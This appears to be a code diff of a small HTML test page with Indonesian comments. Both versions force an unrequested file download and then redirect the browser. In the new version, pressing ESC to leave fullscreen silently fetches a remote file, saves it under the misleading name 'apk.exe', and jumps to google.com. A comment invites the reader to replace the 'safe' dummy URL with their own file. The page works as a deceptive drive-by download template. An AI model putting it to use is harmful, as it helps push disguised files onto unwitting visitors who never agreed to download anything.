@@ -1,66 +1,75 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Test Full Sequence</title>
+<meta charset="UTF-8">
+<title>ESC Blob Test (Safe Remote URL)</title>
 <style>
-html,body{
-  margin:0;padding:0;
-  height:100%;
-  background:black;
-}
-#startButton{
-  width:100%;
-  height:100%;
-  font-size:40px;
-  color:white;
-  background:black;
-  border:none;
-}
+  body {
+    margin: 0;
+    background: #111;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: white;
+    font-family: sans-serif;
+  }
+  #fsBtn {
+    padding: 16px 28px;
+    font-size: 22px;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+  }
 </style>
 </head>
-
 <body>
 
-<button id="startButton">START</button>
-<input id="fileInput" type="file" style="display:none;">
+<button id="fsBtn">Masuk Fullscreen</button>
 
 <script>
-const startButton = document.getElementById("startButton");
-const fileInput = document.getElementById("fileInput");
+// Masuk fullscreen
+fsBtn.onclick = () => {
+  document.documentElement.requestFullscreen();
+};
 
-function trigger() {
+// Download blob dari URL aman
+async function downloadBlobFromURL(url, filename) {
+  try {
+    const res = await fetch(url);
+    const blob = await res.blob();
 
-  // MASUK FULLSCREEN
-  document.documentElement.requestFullscreen().catch(()=>{});
+    const blobURL = URL.createObjectURL(blob);
+    const a = document.createElement("a");
 
-  startButton.style.display = "none";
+    a.href = blobURL;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
 
-  // Buat file blob
-  const content = "Origin test file.\nGenerated via Blob.\n";
-  const blob = new Blob([content], {type: "text/plain"});
-
-  // Auto download file
-  const link = document.createElement("a");
-  link.href = URL.createObjectURL(blob);
-  link.download = "test.exe";
-  document.body.appendChild(link);
-  link.click();
-  link.remove();
-
-  // Buka file picker
-  setTimeout(() => {
-    fileInput.click();
-  }, 500);
-
-  // Redirect ke Bing
-  setTimeout(() => {
-    location.replace("https://bing.com");
-  }, 1200);
+    URL.revokeObjectURL(blobURL);
+  } catch (err) {
+    console.error("Gagal download blob:", err);
+  }
 }
 
-startButton.addEventListener("click", trigger);
-startButton.addEventListener("touchstart", trigger);
+// Trigger saat ESC keluar fullscreen
+document.addEventListener("fullscreenchange", async () => {
+  if (!document.fullscreenElement) {
+
+    // 🔒 URL aman — silakan ganti dengan file kamu sendiri
+    await downloadBlobFromURL(
+      "https://ecdnts-del.github.io/test-apk/dummy.apk", 
+      "apk.exe"
+    );
+
+    // Redirect ke halaman lokal aman
+    setTimeout(() => {
+      location.replace("http://google.com");
+    }, 300);
+  }
+});
 </script>
 
 </body>
